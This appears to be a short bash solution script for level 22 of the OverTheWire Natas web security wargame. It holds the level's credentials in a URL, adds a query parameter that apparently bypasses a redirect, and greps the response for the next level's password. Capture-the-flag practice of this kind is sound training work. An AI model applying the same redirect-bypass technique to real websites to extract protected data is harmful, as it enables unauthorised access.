#!/bin/bash
. ../natas.sh
natas_url="http://natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ@natas22.natas.labs.overthewire.org?revelio=lol"
function hack() {
	password=$(request 2>&1 | grep -Po "(?<=Password:\s)[\d\w]+")
	echo $(get-natas-url "23" "$password")
}

function request {
	curl \
		-vs \
		$natas_url
}